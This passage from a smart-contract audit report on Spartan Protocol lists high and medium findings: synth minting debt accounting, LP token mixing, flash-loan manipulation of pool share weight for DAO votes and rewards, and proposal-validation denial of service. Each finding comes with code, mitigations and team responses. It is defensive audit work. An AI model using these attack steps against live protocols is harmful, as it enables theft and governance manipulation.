class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_tokenAmount</span><span class=\"mtk1\">() </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">debt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Swap SPARTA for Synths</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mintSynth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">synthOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">member</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">iSYNTHFACTORY</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">SYNTHFACTORY</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">isSynth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">synthOut</span><span class=\"mtk1\">) == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!synth&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Must be a valid Synth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_actualInputBase</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getAddedBaseAmount</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// Get received SPARTA amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Use tokenAmount - debt to calculate the value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">output</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iUTILS</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">UTILS</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">calcSwapOutput</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_actualInputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_tokenAmount</span><span class=\"mtk1\">()); </span><span class=\"mtk3\">// Calculate value of swapping SPARTA to the relevant underlying TOKEN</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// increment the debt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">output</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_liquidityUnits</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iUTILS</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">UTILS</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">calcLiquidityUnitsAsym</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_actualInputBase</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// Calculate LP tokens to be minted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_incrementPoolBalances</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_actualInputBase</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Update recorded SPARTA amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iUTILS</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">UTILS</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">calcSwapFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_actualInputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Calc slip fee in TOKEN</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iUTILS</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">UTILS</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">calcSpotValueInBase</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TOKEN</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_fee</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Convert TOKEN fee to SPARTA</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">synthOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_liquidityUnits</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Mint the LP tokens directly to the Synth contract to hold</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">iSYNTH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">synthOut</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintSynth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk12\">output</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Mint the Synth tokens directly to the user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_addPoolMetrics</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fee</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Add slip fee to the revenue metrics</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MintSynth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk12\">BASE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_actualInputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">TOKEN</span><span class=\"mtk1\">, </span><span class=\"mtk12\">outputAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">output</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/59#issuecomment-883866084\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>We agree with the issue submitted, discussions are already in progress around ensuring the mint rate considers the floating debt.\nPotential high risk, however, hard to create a scenario to prove this.</p>\n</blockquote>\n<h2 id=\"h-12-wrong-calcliquidityholdings-that-leads-to-dead-fund-in-the-pool\" style=\"position:relative;\"><a href=\"#h-12-wrong-calcliquidityholdings-that-leads-to-dead-fund-in-the-pool\" aria-label=\"h 12 wrong calcliquidityholdings that leads to dead fund in the pool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/71\">[H-12] wrong <code>calcLiquidityHoldings</code> that leads to dead fund in the Pool</a></h2>\n<p><em>Submitted by jonah1005</em></p>\n<p>The lptoken minted by the <code>Pool</code> contract is actually the mix of two types of tokens. One is the original lptokens user get by calling <code>addForMember</code>. This lpToken is similar to lp of Uniswap, Crv, Sushi, … etc. The other one is the debt-lp token the Synth contract will get when the user calls <code>mintSynth</code>. The <code>Synth</code> contract can only withdraw <code>Sparta</code> for burning debt-lp. Mixing two types of lp would raise several issues.</p>\n<p>LP user would not get their fair share when they burn the lP.</p>\n<ol>\n<li>Alice adds liquidity with Sparta 1000 and token B 1000 and create a new Pool.</li>\n<li>Bob mint Synth with 1000 Sparta and get debt.</li>\n<li>Alice withdraw all lp Token</li>\n<li>Bob burn all Synth.</li>\n</ol>\n<p>The pool would end up left behind a lot of token B in the Pool while there’s no lp holder.</p>\n<p>I would say this is a high-risk vulnerability since it pauses unspoken risks and losses for all users (all the time)</p>\n<p>The logic of <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L192-L202\">burn original lp</a> and <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L244-L257\">burn debt-lp</a>.</p>\n<p>I do not know whether this is the team’s design choice or its composite with a series of bugs. If this is the original design, I do not come up with a fix. It’s a bit similar to the impermanent loss. However, the loss would be left behind in the Pool. This is more complicated and maybe worse than the impermanent loss. If this is the design choice, I think it’s worth emphasize and explain to the users.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/71#issuecomment-884588473\">verifyfirst (Spartan) confirmed and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>We are in discussion of a viable solution to limit the effects of a bank run.\nOne example is limiting the minted synths based on the depth of its underlying pool.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/71#issuecomment-892408842\">SamusElderg (Spartan) commented</a>:</strong></p>\n<blockquote>\n<p>LP units are only used for accounting; even if they were drained to zero or vice versa on the synth contract; they would result in the same redemption value when burning. Hence the risk is low; however there is already discussions on implementing controls to synths including a maximum synthSupply vs tokenDepth ratio to prevent top-heavy synths ontop of the pools which isn’t really specific to the warden’s scenario; however does help limit those ‘unknowns’ that the warden addressed.</p>\n</blockquote>\n<h2 id=\"h-13-flash-loan-manipulation-on-getpoolshareweight-of-utils\" style=\"position:relative;\"><a href=\"#h-13-flash-loan-manipulation-on-getpoolshareweight-of-utils\" aria-label=\"h 13 flash loan manipulation on getpoolshareweight of utils permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/238\">[H-13] Flash loan manipulation on <code>getPoolShareWeight</code> of <code>Utils</code></a></h2>\n<p><em>Submitted by shw</em></p>\n<p>The <code>getPoolShareWeight</code> function returns a user’s pool share weight by calculating how many SPARTAN the user’s LP tokens account for. However, this approach is vulnerable to flash loan manipulation since an attacker can swap a large number of TOKEN to SPARTAN to increase the number of SPARTAN in the pool, thus effectively increasing his pool share weight.</p>\n<p>According to the implementation of <code>getPoolShareWeight,</code> a user’s pool share weight is calculated by <code>uints * baseAmount / totalSupply</code>, where <code>uints</code> is the number of user’s LP tokens, <code>totalSupply</code> is the total supply of LP tokens, and <code>baseAmount</code> is the number of SPARTAN in the pool. Thus, a user’s pool share weight is proportional to the number of SPARTAN in the pool. Consider the following attack scenario:</p>\n<ol>\n<li>Supposing the attacked pool is SPARTAN-WBNB. The attacker first prepares some LP tokens (WBNB-SPP) by adding liquidity to the pool.</li>\n<li>The attacker then swaps a large number of WBNB to SPARTAN, which increases the pool’s <code>baseAmount</code>. He could split his trade into small amounts to reduce slip-based fees.</li>\n<li>The attacker now wants to increase his weight in the <code>DaoVault</code>. He adds his LP tokens to the pool by calling the <code>deposit</code> function of <code>Dao.</code></li>\n<li><code>Dao</code> then calls <code>depositLP</code> of <code>DaoVault</code>, causing the attacker’s weight to be recalculated. Due to the large proportion of SPARTAN in the pool, the attacker’s weight is artificially increased.</li>\n<li>With a higher member weight, the attacker can, for example, vote the current proposal with more votes than he should have or obtain more rewards when calling <code>harvest</code> of the <code>Dao</code> contract.</li>\n<li>The attacker then swaps back SPARTAN to WBNB and only loses the slip-based fees.</li>\n</ol>\n<p>Referenced code:\n<a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L46-L50\">Utils.sol#L46-L50</a>,\n<a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L70-L77\">Utils.sol#L70-L77</a>,\n<a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/DaoVault.sol#L44-L56\">DaoVault.sol#L44-L56</a>,\n<a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L201\">Dao.sol#L201</a>, and\n<a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L570\">Dao.sol#L570</a>.</p>\n<p>A possible mitigation is to record the current timestamp when a user’s weight in the <code>DaoVault</code> or <code>BondVault</code> is recalculated and force the new weight to take effect only after a certain period, e.g., a block time. This would prevent the attacker from launching the attack since there is typically no guarantee that he could arbitrage the WBNB back in the next block.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/238#issuecomment-886351432\">SamusElderg (Spartan) confirmed and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>Recommended mitigation has been included in contributors ongoing discussions to make this more resistant to manipulation</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/238#issuecomment-894866142\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Keeping high risk because of impact</p>\n</blockquote>\n<h1 id=\"medium-risk-findings-14\" style=\"position:relative;\"><a href=\"#medium-risk-findings-14\" aria-label=\"medium risk findings 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (14)</h1>\n<h2 id=\"m-01-daosol-insufficient-validation-for-proposal-creation\" style=\"position:relative;\"><a href=\"#m-01-daosol-insufficient-validation-for-proposal-creation\" aria-label=\"m 01 daosol insufficient validation for proposal creation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/43\">[M-01] <code>Dao.sol</code>: Insufficient validation for proposal creation</a></h2>\n<p><em>Submitted by hickuphh3, 0xRajeev, also found by gpersoon and shw</em></p>\n<p>In general, creating invalid proposals is easy due to the lack of validation in the <code>new*Proposal()</code> functions.</p>\n<ul>\n<li>The <code>typeStr</code> is not validated at all. For example, one can call <code>newActionProposal()</code> with <code>typeStr = ROUTER</code> or <code>typeStr = BAD_STRING</code>, both of which will pass. The first will cause <code>finaliseProposal()</code> to fail because the proposed address is null, preventing <code>completeProposal()</code> from executing. The second does nothing because it does not equate to any of the check <code>typeStr</code>, and so <code>completeProposal()</code> isn’t executed at all.</li>\n<li>Not checking the proposed values are null. The checks only happen in <code>finaliseProposal()</code> when the relevant sub-functions are called, like the <code>move*()</code> functions.</li>\n</ul>\n<p>All of these scenarios lead to a mandatory 15 day wait since proposal creation in order to be cancelled, which prevents the creation of new proposals (in order words, denial of service of the DAO).</p>\n<p><strong>Recommended Steps</strong>:</p>\n<ol>\n<li>\n<p>Since the number of proposal types is finite, it is best to restrict and validate the <code>typeStr</code> submitted. Specifically,</p>\n<ul>\n<li><code>newActionProposal()</code> should only allow <code>FLIP_EMISSIONS</code> and <code>GET_SPARTA</code> proposal types</li>\n<li><code>newAddressProposal()</code> should only allow <code>DAO</code>, <code>ROUTER</code>, <code>UTILS</code>, <code>RESERVE</code>, <code>LIST_BOND</code>, <code>DELIST_BOND</code>, <code>ADD_CURATED_POOL</code> and  <code>REMOVE_CURATED_POOL</code> proposal types</li>\n<li><code>newParamProposal()</code> should only allow <code>COOL_OFF</code> and <code>ERAS_TO_EARN</code> proposal types</li>\n</ul>\n</li>\n<li>Perhaps have a “catch-all-else” proposal that will only call <code>_completeProposal()</code> in <code>finaliseProposal()</code></li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">finaliseProposal</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">isEqual</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_type</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;ADD_CURATED_POOL&#39;</span><span class=\"mtk1\">)){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">_addCuratedPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentProposal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">isEqual</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_type</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;REMOVE_CURATED_POOL&#39;</span><span class=\"mtk1\">)){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_removeCuratedPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentProposal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">completeProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<ol start=\"3\">\n<li>Do null validation checks in <code>newAddressProposal()</code> and <code>newParamProposal()</code></li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">newAddressProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposedAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">typeStr</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposedAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;!address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// TODO: validate typeStr</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">newParamProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">param</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">typeStr</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!param&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// TODO: validate typeStr</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/43#issuecomment-883857718\">verifyfirst (Spartan) confirmed and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>A valid issue in reducing annoyance for DAO proposals. Suggested mitigation fixes the issue.\nMedium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/43#issuecomment-894836271\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The only attack vector here is DoS attack which could be fought by the community by pooling funds for flashbot TX that front runs the attacker. While inconvenient, it doesn’t stop the protocol for long. Agree with sponsor about severity.</p>\n</blockquote>\n<h2 id=\"m-02-missleading-onlydao-modifiers\" style=\"position:relative;\"><a href=\"#m-02-missleading-onlydao-modifiers\" aria-label=\"m 02 missleading onlydao modifiers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/172\">[M-02] Missleading <code>onlyDAO</code> modifiers</a></h2>\n<p><em>Submitted by cmichel, 0xRajeev, 0xsanson, gpersoon, also found by hickuphh3 and shw</em></p>\n<p>Several contracts implement an <code>onlyDAO</code> modifier which, as the name suggests, should only authorize the function to be executed by the DAO.\nHowever, some implementations are wrong and either allow the DAO or the deployer to execute, or even only the deployer:</p>\n<p>Incorrect implementations:</p>\n<ul>\n<li><code>BondVault.onlyDAO</code>: allows deployer + DAO</li>\n<li><code>DAO.onlyDAO</code>: allows deployer</li>\n<li><code>DAOVault.onlyDAO</code>: allows deployer + DAO</li>\n<li><code>poolFactory.onlyDAO</code>: allows deployer + DAO</li>\n<li><code>Router.onlyDAO</code>: allows deployer + DAO</li>\n<li><code>Synth.onlyDAO</code>: allows deployer</li>\n<li><code>synthFactory.onlyDAO</code>: allows deployer</li>\n<li><code>synthVault.onlyDAO</code>: allows deployer + DAO</li>\n</ul>\n<p>In all of these functions, the deployer may execute the function as well which is a centralization risk.\nThe deployer can only sometimes be purged, as in <code>synthFactory</code>, in which case nobody can execute these functions anymore.</p>\n<p>Recommend renaming it to <code>onlyDeployer</code> or <code>onlyDeployerOrDAO</code> depending on who has access.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/172#issuecomment-885654542\">verifyfirst (Spartan) acknowledged</a>:</strong></p>\n<blockquote>\n<p>This is by design a choice.\nHowever, there are current discussions around renaming the high level access modifiers to be more descriptive in their purpose.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/172#issuecomment-894843379\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This is a non-critical issue because there’s no in-code bugs, it’s rather error-prone naming.</p>\n</blockquote>\n<p><strong><a 